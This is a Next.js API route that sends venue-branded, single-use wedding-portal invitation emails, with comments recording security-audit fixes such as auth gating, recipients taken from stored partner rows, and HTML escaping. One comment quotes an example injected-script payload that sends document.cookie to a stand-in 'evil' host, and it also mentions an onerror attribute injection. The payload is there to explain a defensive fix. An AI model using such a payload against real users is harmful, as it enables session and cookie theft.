import { NextRequest, NextResponse } from 'next/server'
import { createServiceClient } from '@/lib/supabase/service'
import { sendEmail } from '@/lib/services/email/transport'
import { mintInviteToken } from '@/lib/services/portal/provision'
import { appUrl } from '@/lib/app-url'
import { escapeHtml } from '@/lib/services/contracts/templates'
import { safeHttpUrl } from '@/lib/utils/safe-url'
import { isValidHexColor } from '@/lib/utils/validation'
import {
  getPlatformAuth,
  assertCanAccessVenue,
  unauthorized,
  forbidden,
} from '@/lib/api/auth-helpers'
import { apiError } from '@/lib/api/api-error'

/**
 * POST /api/portal/invite-couple
 *
 * Sends an invitation email to a couple with a single-use registration
 * link via Resend. White-label:
 *   - Display name on the envelope = venue's business name so couples see
 *     "Rixey Manor" in their inbox, not "The Bloom House".
 *   - replyTo = venue's coordinator email so any reply goes to the venue,
 *     not to Bloom.
 *   - Header background + button colour come from venue_config.primary_color.
 *   - Venue logo embedded in the header when venue_config.logo_url is set.
 *   - AI assistant name in body copy comes from venue_ai_config.ai_name.
 *   - No "Powered by The Bloom House" footer — couples shouldn't know Bloom
 *     exists.
 *
 * The credential (W1, 2026-09-08). Each recipient gets their own 128-bit
 * token, minted here, stored as a sha256 in couple_invites (migration 391),
 * and sent only inside their link. It is single use and it really does
 * expire in 14 days, which the email body has claimed since it was written.
 * The event code is still shown, as a reference a coordinator can read down
 * the phone; it is no longer what lets anybody in.
 *
 * Two partners means two invites and two emails. One token per account
 * keeps the used_at bookkeeping honest, and partner 2 gets a link addressed
 * to them rather than one already spent by partner 1.
 *
 * Sending domain (W55, NOVEMBER-PLAN.md wave 8): the envelope address
 * used to be hardcoded to Bloom's own verified Resend domain regardless
 * of venue — this was the "infrastructure carry-forward" this comment
 * used to flag as deferred. transport.ts now resolves the From address
 * per venue: once this venue's own domain reaches
 * venue_config.sending_domain_status = 'verified' the envelope moves to
 * the venue's own domain automatically; until then it keeps using the
 * platform domain with the venue's business name as the display name,
 * exactly as before (see transport.ts's resolveFrom).
 */

/** How long an invitation is good for. Matches the email copy. */
const INVITE_TTL_DAYS = 14

export async function POST(request: NextRequest) {
  try {
    // Auth gate. Pre-fix this route would send a Resend-billed branded
    // invitation email to any address with any eventCode against any
    // venue's branding, AND stamp couple_invited_at on any wedding.
    // Resend-quota abuse + impersonation surface. Per 2026-05-06 audit
    // Lens 1.
    const auth = await getPlatformAuth()
    if (!auth) return unauthorized()

    const body = await request.json()
    // S5 (2026-09-14 security audit, item 10): `email` and `partnerEmail`
    // are no longer read off the body at all. Who receives a registration
    // credential for this wedding is the wedding's business, and it is
    // settled further down from the wedding's own `people` rows.
    const { weddingId, venueId: requestedVenueId, coupleName } = body
    let { eventCode } = body

    if (!weddingId) {
      return NextResponse.json(
        { error: 'Missing required field: weddingId' },
        { status: 400 }
      )
    }

    const supabase = createServiceClient()

    // Scope check FIRST, before anything reads or writes on this wedding.
    // It used to sit below, after the people read had already returned a
    // stranger's email address and after provisionCouplePortal had minted
    // an event code and a wedding_details shell on a wedding belonging to
    // another venue. The 403 came too late to prevent either.
    const { data: wedding } = await supabase
      // legacy-read-ok: MIRROR-MAINTENANCE: portal credentials are keyed to
      // the legacy wedding and its people rows, and couple_invited_at is a
      // weddings column. See REPAIR-ENDPOINTS.md.
      .from('weddings')
      .select('venue_id')
      .eq('id', weddingId)
      .maybeSingle()

    if (!wedding) {
      return NextResponse.json({ error: 'Wedding not found' }, { status: 404 })
    }

    const venueId = wedding.venue_id as string
    const decision = await assertCanAccessVenue(auth, venueId)
    if (!decision.ok) return forbidden(`wedding ${decision.reason}`)
    // If the caller supplied venueId, it MUST match the wedding's
    // venue_id (catches client-side bugs without breaking the contract).
    if (requestedVenueId && requestedVenueId !== venueId) {
      return NextResponse.json(
        { error: 'venueId does not match wedding owner' },
        { status: 400 }
      )
    }

    // The "resolve the couple's email from partner1 when the caller did
    // not supply one" block used to sit here. S5 (2026-09-14 security
    // audit, item 10) removed it along with `email` and `partnerEmail`:
    // the recipient list is derived from the wedding's partner rows
    // further down, so there is no caller-supplied address to fall back
    // from any more.

    // Ensure the wedding is portal-ready. A CRM-imported booked couple
    // has no event_code until now; provisionCouplePortal mints one (and
    // a wedding_details shell). The caller may still pass an explicit
    // eventCode to override.
    if (!eventCode) {
      const { provisionCouplePortal } = await import(
        '@/lib/services/portal/provision'
      )
      const provisioned = await provisionCouplePortal(supabase, weddingId)
      eventCode = provisioned.event_code
    }
    if (!eventCode) {
      return NextResponse.json(
        { error: 'Could not resolve an event code for this wedding' },
        { status: 500 }
      )
    }

    // Pull venue + branding + AI name in one round trip.
    const [{ data: venue }, { data: venueConfig }, { data: aiConfig }] = await Promise.all([
      supabase.from('venues').select('name, slug').eq('id', venueId).maybeSingle(),
      supabase
        .from('venue_config')
        .select(
          'business_name, coordinator_name, coordinator_email, logo_url, primary_color, portal_tagline'
        )
        .eq('venue_id', venueId)
        .maybeSingle(),
      supabase
        .from('venue_ai_config')
        .select('ai_name')
        .eq('venue_id', venueId)
        .maybeSingle(),
    ])

    if (!venue) {
      return NextResponse.json({ error: 'Venue not found' }, { status: 404 })
    }

    const businessName = venueConfig?.business_name || venue.name
    const coordinatorEmail = venueConfig?.coordinator_email || undefined
    const coordinatorName = venueConfig?.coordinator_name || undefined
    const logoUrl = venueConfig?.logo_url || null
    const primaryColor = venueConfig?.primary_color || '#7D8471'
    const tagline = venueConfig?.portal_tagline || 'Your wedding planning portal'
    // T5-β.1: refuse to send an invite that would brand-leak as "Sage"
    // when the venue hasn't named their AI yet.
    const resolvedAiName = (aiConfig?.ai_name as string | null | undefined)?.trim()
    if (!resolvedAiName) {
      return NextResponse.json(
        {
          error:
            'Cannot send invite: venue_ai_config.ai_name is not set. Run onboarding for this venue first.',
        },
        { status: 400 }
      )
    }
    const aiName = resolvedAiName

    const portalUrl = appUrl(`/couple/${venue.slug}`)

    const subject = `You've been invited to your ${businessName} wedding portal`
    // S5 (2026-09-14 security audit, item 10). The recipient list used to
    // be `[body.email, body.partnerEmail]`. Both came straight off the
    // request, so a coordinator (or anything holding a coordinator
    // session) could send a real, venue-branded, single-use registration
    // link for someone else's wedding to an address of their choosing —
    // the invite row was written with the WEDDING's venue and wedding id
    // regardless of who the email went to. Whoever opened it became that
    // couple.
    //
    // Recipients now come from the wedding's own `people` rows. The body
    // no longer chooses who gets a credential; it can only ask for the
    // wedding, and the wedding says who its partners are.
    const { data: partnerRows } = await supabase
      // legacy-read-ok: MIRROR-MAINTENANCE: portal credentials are keyed to
      // the legacy wedding and its people rows, and couple_invited_at is a
      // weddings column. See REPAIR-ENDPOINTS.md.
      .from('people')
      .select('email, role')
      .eq('wedding_id', weddingId)
      .in('role', ['partner1', 'partner2'])
      .is('merged_into_id', null)
      .not('email', 'is', null)

    // De-duplicate: a couple who share an address should get one invite,
    // not two tokens racing for the same account.
    const recipients = Array.from(
      new Map(
        ((partnerRows ?? [])
          .map((r) => (r as { email?: string | null }).email)
          .filter((e): e is string => typeof e === 'string' && e.trim().length > 0))
          .map((addr) => [addr.trim().toLowerCase(), addr.trim()] as const),
      ).values(),
    )

    if (recipients.length === 0) {
      return NextResponse.json(
        {
          error:
            'No partner email on file for this couple — add a contact email on the wedding first.',
        },
        { status: 400 }
      )
    }
    // Fall back to partner1's first name when the caller didn't pass one
    // through. A bare "there" at the top of a personal invitation reads
    // like a mail-merge template that wasn't filled out.
    const safeCoupleName = coupleName?.trim() || 'there'

    // Sender display name = the venue's business name, used as the
    // fromName fallback whenever this venue's own domain isn't verified
    // yet (transport.ts resolveFrom). Once verified, sending_from_name
    // from venue_config takes over and the envelope itself moves to the
    // venue's own domain — see the module doc comment above.

    // White-label email body. No references to Bloom anywhere a couple
    // can see.
    // S5 (2026-09-14 security audit, item 10). Every one of these values
    // is venue-editable free text out of venue_config, and they used to
    // go into the markup raw. A business name of
    // `"><script>fetch('//evil/?c='+document.cookie)</script>` shipped
    // that script to the couple in an email the venue's own domain
    // signed; a logo_url of `x" onerror="…` did the same with fewer
    // characters. primaryColor lands inside a style attribute, which is
    // its own injection surface. escapeHtml is the same helper the
    // contract templates use — there is no second escaping convention
    // here, on purpose.
    const safeBusinessName = escapeHtml(businessName)
    const safeTagline = escapeHtml(tagline)
    const safeAiName = escapeHtml(aiName)
    const safeEventCode = escapeHtml(eventCode)
    // A colour goes into `style="background:…"`. Refuse anything that is
    // not a plain hex colour rather than trying to escape CSS.
    const safeColor = isValidHexColor(primaryColor) ? primaryColor : '#7D8471'
    // A logo URL goes into `src="…"`. Escape it AND require it to be an
    // http(s) URL, so `javascript:` and `data:` cannot get in.
    const safeLogoUrl = safeHttpUrl(logoUrl)

    const logoBlock = safeLogoUrl
      ? `<img src="${escapeHtml(safeLogoUrl)}" alt="${safeBusinessName}" style="max-height:44px;display:block;margin-bottom:12px;" />`
      : `<h1 style="margin:0;font-size:22px;font-weight:600;color:#FFFFFF;font-family:Georgia,serif;">${safeBusinessName}</h1>`

    const signOffLine = coordinatorName
      ? `${escapeHtml(coordinatorName)}<br/><span style="color:rgba(0,0,0,0.6);font-weight:400;">${safeBusinessName}</span>`
      : safeBusinessName

    function buildHtml(registerUrl: string): string {
      const href = escapeHtml(registerUrl)
      return `<!DOCTYPE html>
<html>
<head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"></head>
<body style="margin:0;padding:0;background:#FDFAF6;font-family:'Helvetica Neue',Helvetica,Arial,sans-serif;color:#2D2D2D;">
  <table width="100%" cellpadding="0" cellspacing="0" style="max-width:600px;margin:0 auto;background:#FFFFFF;border-radius:8px;overflow:hidden;">
    <tr>
      <td style="background:${safeColor};padding:28px;">
        ${logoBlock}
        <p style="margin:6px 0 0;font-size:14px;color:rgba(255,255,255,0.85);">
          ${safeTagline}
        </p>
      </td>
    </tr>
    <tr>
      <td style="padding:28px;">
        <h2 style="margin:0 0 12px;font-size:20px;">Hi ${escapeHtml(safeCoupleName)},</h2>
        <p style="margin:0 0 14px;font-size:15px;line-height:1.55;">
          You've been invited to your wedding planning portal at <strong>${safeBusinessName}</strong>.
          It includes ${safeAiName} (your AI wedding concierge), budget tracking, guest list,
          seating chart, timeline builder, and direct messaging with your coordinator.
        </p>
        <p style="margin:0 0 24px;">
          <a href="${href}" style="display:inline-block;padding:12px 24px;background:${safeColor};color:#FFFFFF;text-decoration:none;border-radius:8px;font-weight:600;">
            Set up your account
          </a>
        </p>
        <p style="margin:0 0 12px;font-size:13px;color:#6B7280;">
          Or paste this into your browser:
          <a href="${href}" style="color:${safeColor};">${href}</a>
        </p>
        <p style="margin:0 0 12px;font-size:13px;color:#6B7280;">
          This link is just for you and can only be used once. It expires in
          ${INVITE_TTL_DAYS} days. If you have any trouble, just reply to this email.
        </p>
        <p style="margin:0 0 24px;font-size:13px;color:#6B7280;">
          Your reference for this wedding is
          <strong style="font-family:monospace;background:#F3F4F6;padding:2px 8px;border-radius:4px;">${safeEventCode}</strong>
          — handy if you ring us, but you won't need it to sign up.
        </p>
        <p style="margin:0;font-size:14px;line-height:1.55;color:#2D2D2D;">
          ${signOffLine}
        </p>
      </td>
    </tr>
    <tr>
      <td style="padding:20px 28px;border-top:1px solid #F3F4F6;">
        <p style="margin:0;font-size:12px;color:#6B7280;text-align:center;">
          ${safeBusinessName}
        </p>
      </td>
    </tr>
  </table>
</body>
</html>`
    }

    const expiresAt = new Date(
      Date.now() + INVITE_TTL_DAYS * 24 * 60 * 60 * 1000
    ).toISOString()

    const sent: { email: string; ok: boolean; error?: string }[] = []
    let firstRegisterUrl: string | null = null

    for (const recipient of recipients) {
      const { token, tokenHash } = mintInviteToken()

      // Store the invite BEFORE sending. If the row does not land, the
      // link in the email would be dead on arrival, and a couple staring
      // at "this invitation is not valid" has no way to tell that from
      // being locked out. Fail loudly instead.
      const { error: inviteErr } = await supabase.from('couple_invites').insert({
        venue_id: venueId,
        wedding_id: weddingId,
        email: recipient.toLowerCase(),
        token_hash: tokenHash,
        expires_at: expiresAt,
        created_by: auth.userId ?? null,
      })

      if (inviteErr) {
        console.error('[invite-couple] Failed to store invitation:', inviteErr)
        return NextResponse.json(
          { error: 'Could not create the invitation. Please try again.' },
          { status: 500 }
        )
      }

      const registerUrl = `${portalUrl}/register?invite=${token}`
      if (!firstRegisterUrl) firstRegisterUrl = registerUrl

      const emailResult = await sendEmail({
        to: recipient,
        subject,
        html: buildHtml(registerUrl),
        venueId,
        fromName: businessName,
        replyTo: coordinatorEmail,
      })

      if (!emailResult.ok) {
        console.error(
          `[invite-couple] Failed to send invitation to ${recipient}:`,
          emailResult.error
        )
      } else {
        console.log(
          `[invite-couple] Sent invitation to ${recipient} (id: ${emailResult.id ?? 'n/a'})`
        )
      }
      sent.push({ email: recipient, ok: emailResult.ok, error: emailResult.error })
    }

    await supabase
      // legacy-read-ok: MIRROR-MAINTENANCE: portal credentials are keyed to
      // the legacy wedding and its people rows, and couple_invited_at is a
      // weddings column. See REPAIR-ENDPOINTS.md.
      .from('weddings')
      .update({ couple_invited_at: new Date().toISOString() })
      .eq('id', weddingId)

    const allSent = sent.every((s) => s.ok)
    return NextResponse.json({
      success: true,
      // The coordinator can copy this and read it out if the email bounces.
      // It carries partner 1's token, so it is not a generic link.
      registerUrl: firstRegisterUrl,
      eventCode,
      expiresAt,
      recipients: sent.map((s) => s.email),
      emailSent: allSent,
      emailError: allSent ? undefined : sent.find((s) => !s.ok)?.error,
    })
  } catch (err) {
    return apiError(err)
  }
}
